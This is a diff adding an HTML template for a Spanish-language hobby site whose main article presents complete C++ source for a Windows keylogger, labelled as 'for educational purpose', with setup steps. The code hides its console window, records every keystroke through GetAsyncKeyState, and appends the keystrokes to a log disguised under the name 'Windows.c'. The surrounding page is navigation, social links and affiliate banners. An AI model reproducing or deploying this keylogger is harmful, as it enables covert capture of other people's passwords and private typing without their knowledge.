@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="author" content="Pirate">
+    <meta name="copyright" content="© 2021 PRS">
+    <meta name="description" content="Pirate Radio Show a website that teaches programing while enjoying the video games.">
+    <meta name="keywords" content="pirate, radio, show, anonymous, anonymous radio station, c++, c plus plus, c, c#, linux, coding, tutorial, tutorials, course, learn, courses, hacking, ethical, operating, system, systems, gaming, live, livestream, java, pyhton, python3, flask, websites, web, website, mobile application, mobile, phones, phone, app, applicationrust, free games, youtube, twitch, make, money, online, community, freelancer, freelancers, digital, home office, basics of cpp, cpp, g++, basics of coding, basics of programing, computing, free, games, free games, open, source, open source, maths, mathematics, physics, science, fiction, sience fiction, windows, microsoft, visual studio, visual, studio, source command, commands, syntax, compile, set up, install, source, example, examples, security, cyber, cyber security, english, beginner, c++ for beginners, beginners, ctf, CTF, capture the flag, capture flag, coding challenge, challenge, pen test, penetration, pentest, penetration testing, testing, object oriented programming, object, oriented, key logger, keylogger, key, logger, cloud, hackers, cyber hackers, hactivists, hacktivism, steam, steam punks, punks, punk , steam punk, epic games, epic, GeForce Now, Nvidia, nvidia, NVIDIA, NVidia, geforce, geforce now, exercise, exercises, experiment, experiments, bit, coin, coins, BTC, btc, invite, gifts, gift, crypto, currency, eng">
+    <meta name="Subject" content="Web Page Subject">
+    <meta name="expires" content="never" />
+    <meta name="viewport" content="width=device-width" initial-scale="1.0">
+    <meta name="google-site-verification" content="UMBwmsZQFss_tZhxUd4JMSZglv7_XytJHEbeKGM2b4Q" />
+    <meta http-equiv="content-language" content="es">
+    <meta name="language" content="Spanish">
+    <meta name="Distribution" content="Global">
+    <title>Pirata Radio Show</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css')}}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_2.css')}}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_3.css')}}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_4.css')}}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/market.css')}}">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='img/favicon.png')}}">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div id="branding">
+                <h1><span class="highlight">☠-|PRS|-☠</span></h1>
+            </div>
+            <nav id="services">
+                <div class="container">
+                    <form>
+                        <button formaction="/inicio">
+                            ☠| Inicio |☠
+                        </button>
+                        <!-- class="buttons"  error itt Check mobile version with & without class--->
+                        <select name="Lang-3" onchange="javascript:handleSelect(this);">
+
+                            <option value="#">
+                                Sigue nos en:
+                            </option>
+
+                            <option value="https://www.twitch.tv/pirateradioshow98">
+                                ☠| Twitch -PRS- |☠
+                            </option>
+
+                            <option value="https://www.twitch.tv/VieraGuti">
+                                ☠| Twitch VieraGuti|☠
+                            </option>
+
+                            <option value="https://www.twitch.tv/legozgz">
+                                ☠| Twitch -LEGO- |☠
+                            </option>
+
+                            <option value="https://www.twitch.tv/beyker1965">
+                                ☠| Twitch -BEYKER- |☠
+                            </option>
+
+                            <option value="https://www.youtube.com/channel/UC6JWt6KSex34qH7rpokdTpg">
+                                ☠| Youtube -BEYKER- |☠
+                            </option>
+
+                            <option value="https://www.youtube.com/channel/UCmd2roksoxIvMrE8R8p6u3g">
+                                ☠| Youtube -Pirate Code- |☠
+                            </option>
+
+                            <option value="https://www.facebook.com/Pirate-Radio-Show-103686634953174">
+                                ☠| Facebook -PRS- |☠
+                            </option>
+
+                            <option value="https://twitter.com/show_pirate">
+                                ☠| Twitter -PRS- |☠
+                            </option>
+
+                            <option value="https://www.instagram.com/pirateradioshow98/">
+                                ☠| Instagram -PRS- |☠
+                            </option>
+                        </select>
+                        <select name="Lang-3" onchange="javascript:handleSelect(this);">
+                            <option value="#">
+                                ☠| Chat |☠
+                            </option>
+                            <option value="https://s.team/chat/FVI1GpWg">
+                                ☠| Steam |☠
+                            </option>
+                            <option value="https://discord.gg/3t82PbymUc">
+                                ☠| Discord |☠
+                            </option>
+                        </select>
+
+                        <select name="Lang-3" onchange="javascript:handleSelect(this);">
+                            <option value="#">
+                                ☠| Para Programadores: |☠
+                            </option>
+
+                            <option value="/Aprender_ESP">
+                                ☠| Estudia Programación |☠
+                            </option>
+
+                            <option value="https://github.com/Oscuras98/">
+                                ☠| GitHUB |☠
+                            </option>
+
+                            <option value="https://www.facebook.com/groups/765324447394866">
+                                ☠| Grupo de Facebook |☠
+                            </option>
+                        </select>
+
+                        <button formaction="/Juegos_GRATIS_ESP">
+                            ☠| Videojuegos Gratis |☠
+                        </button>
+                        <button formaction="/WOT_SPAIN">
+                            ☠| WOT SPAIN |☠
+                        </button>
+                        <button formaction="/Donaciones_ESP">
+                            ☠| Donaciones |☠
+                        </button>
+                        <select name="Lang-3" onchange="javascript:handleSelect(this)">
+                            <option value="#">
+                                Languages
+                            </option>
+
+                            <option value="/Pentest_1_ENG">
+                                English
+                            </option>
+
+                            <option value="/Penteszt_1_HUN">
+                                Magyar
+                            </option>
+                        </select>
+                    </form>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <section id="newsletter">
+        <div class="container">
+            <h3><font color="red">Aviso </font>El Codigo está compartido por Propósito Educativo!</h3>
+            <br />
+            <form action="https://picoctf.org/" method="get" target="_blank">
+                <button type="submit">Captura La Bandera</button>
+            </form>
+            <form action="https://www.hackthebox.eu/" method="get" target="_blank">
+                <button type="submit">Hack The Box</button>
+            </form>
+        </div>
+    </section>
+
+
+
+    <section id="main">
+        <div class="container">
+            <article id="main-col">
+                <h3 class="page-title">El fuente de un KeyLogger en C++ por Propósito Educativo!</h3>
+                <aside id="sidebar">
+                    <div class="stage" style="width: 120px; height: 120px;">
+                        <div class="cubespinner">
+                            <div class="face1">
+                                <center>
+                                    <form class="money">
+                                        <a href="https://panel.marketagent.com/Register/Account/NewRegistration/en-US?RefUID=3145223 target="_new"><img style="border-style: none; width: 120px; height: 60px" src="http://www.marketagent.com/MA_WebResources/pic/banner/120x60_Marketagent_weiss_US.gif"></a>
+                                    </form>
+                                </center>
+                            </div>
+                        </div>
+                    </div>
+                </aside>
+                <ul id="services">
+                    <li>
+                        <h3>Como usar?</h3>
+                        <p>Para poder crear este Key Logger potente tienes que descargar: <a href="https://visualstudio.microsoft.com/">Visual Studio Code</a> en tu máquina cual tenga un Windows 10 installado desde que Mac OS y GNU Linux no tiene la libreria de Windows.h includia.</p>
+                        <p>En el caso que ya tengás una systema operativo montada con Visual Studio Code solamente tendrás que descargar el entorno virtual de C++</p>
+                        <form action="https://visualstudio.microsoft.com/vs/features/cplusplus/">
+                            <input type="submit" value="Download" formtarget="_blank" />
+                        </form>
+                        <p>Si todo está listo crea un projecto de consola nueva usando C++</p>
+                        <p>Después de copiar el fuente de codigo tenemos que añadir una función para el IDE para poder usar funciones no seguras o viejas.</p>
+                        <p>Para eso tenemos que buscar los preprocesadores del projecto y añadir: _CRT_SECURE_NO_WARNINGS;</p>
+                    </li>
+                </ul>
+                <img src="{{ url_for('static', filename='img/ESP/Estudia/C++/KeyLogger/1.png')}}">
+                <br />
+                <img src="{{ url_for('static', filename='img/ESP/Estudia/C++/KeyLogger/2.png')}}">
+                <br />
+                <img src="{{ url_for('static', filename='img/ESP/Estudia/C++/KeyLogger/3.png')}}">
+                <br />
+                <img src="{{ url_for('static', filename='img/ESP/Estudia/C++/KeyLogger/4.png')}}">
+                <br />
+                <img src="{{ url_for('static', filename='img/ESP/Estudia/C++/KeyLogger/5.png')}}">
+                <aside id="sidebar">
+                    <div class="stage" style="width: 120px; height: 120px;">
+                        <div class="cubespinner">
+                            <div class="face1">
+                                <center>
+                                    <form class="money">
+                                        <a href="https://panel.marketagent.com/Register/Account/NewRegistration/en-US?RefUID=3145223 target="_new"><img style="border-style: none; width: 120px; height: 60px" src="http://www.marketagent.com/MA_WebResources/pic/banner/120x60_Marketagent_weiss_US.gif"></a>
+                                    </form>
+                                </center>
+                            </div>
+                        </div>
+                    </div>
+                </aside>
+                <ul id="services">
+                    <li>
+                        <h3>Fuente de codigo:</h3>
+                        <pre class='brush: cpp'>
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+
+void guardador(int codigo_del_teclado);
+int main(int argc, char* argv[])
+{
+	HWND WINDOW_HANDLER;
+	WINDOW_HANDLER = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(WINDOW_HANDLER, 0);
+	char i;
+	while (1)
+	{
+		// Vamos a ver todas las teclas
+		for (i = 8; i <= 190; i++)
+		{
+			if (GetAsyncKeyState(i) == -32767)	// tecla ha sido presionada
+			{
+				guardador(i);
+				if (i == 27)
+				{
+					ShowWindow(WINDOW_HANDLER, 1);
+					return 0;
+				}
+			}
+		}
+	}
+	return 0;
+}
+void guardador(int codigo_del_teclado)
+{
+	// No vamos a tocar la raton
+	if ((codigo_del_teclado == 1) || (codigo_del_teclado == 2)) return;
+	printf("%c\n", codigo_del_teclado);
+
+	FILE* LOGS_Guardados;
+	LOGS_Guardados = fopen("Windows.c", "a+"); // .txt .c o cualquier formato le puedes declarar!
+	if (codigo_del_teclado == 8)
+		fprintf(LOGS_Guardados, "%s", "[BACKSPACE]");
+	else if (codigo_del_teclado == 13)
+		fprintf(LOGS_Guardados, "%s", "[ENTER]\n");
+	else if (codigo_del_teclado == 32)
+		fprintf(LOGS_Guardados, "%s", " ");
+	else if (codigo_del_teclado == VK_ESCAPE)
+		fprintf(LOGS_Guardados, "%s", "[ESCAPE]");
+	else if (codigo_del_teclado == VK_END)
+		fprintf(LOGS_Guardados, "%s", "[END]");
+	else if (codigo_del_teclado == VK_HOME)
+		fprintf(LOGS_Guardados, "%s", "[HOME]");
+	else if (codigo_del_teclado == VK_TAB)
+		fprintf(LOGS_Guardados, "%s", "[TAB]");
+	else if (codigo_del_teclado == VK_CONTROL)
+		fprintf(LOGS_Guardados, "%s", "[CONTROL]");
+	else if (codigo_del_teclado == VK_SHIFT)
+		fprintf(LOGS_Guardados, "%s", "[SHIFT]");
+	else if (codigo_del_teclado == VK_DOWN)
+		fprintf(LOGS_Guardados, "%s", "[DOWN ARROW]");
+	else if (codigo_del_teclado == VK_UP)
+		fprintf(LOGS_Guardados, "%s", "[UP ARROW]");
+	else if (codigo_del_teclado == VK_LEFT)
+		fprintf(LOGS_Guardados, "%s", "[LEFT ARROW]");
+	else if (codigo_del_teclado == VK_RIGHT)
+		fprintf(LOGS_Guardados, "%s", "[RIGHT ARROW]");
+	else if (codigo_del_teclado == 190 || codigo_del_teclado == 110)
+		fprintf(LOGS_Guardados, "%s", ".");
+	else fprintf(LOGS_Guardados, "%s", &codigo_del_teclado);
+	fclose(LOGS_Guardados);
+}
+  </pre>
+                    </li>
+                </ul>
+            </article>
+        </div>
+    </section>
+
+
+    <footer>
+        <div class="container">
+            <div id="branding">
+                <h2>
+                    <font color="green">☠-|PRS|-☠</font> Diseño Web hecho por: <font color="littleblue">Pirata </font>&copy;
+                    2021
+                </h2>
+            </div>
+        </div>
+    </footer>
+</body>
+<script type="text/javascript" src="{{ url_for('static', filename='scripts/main.js')}}"></script>
+</html>
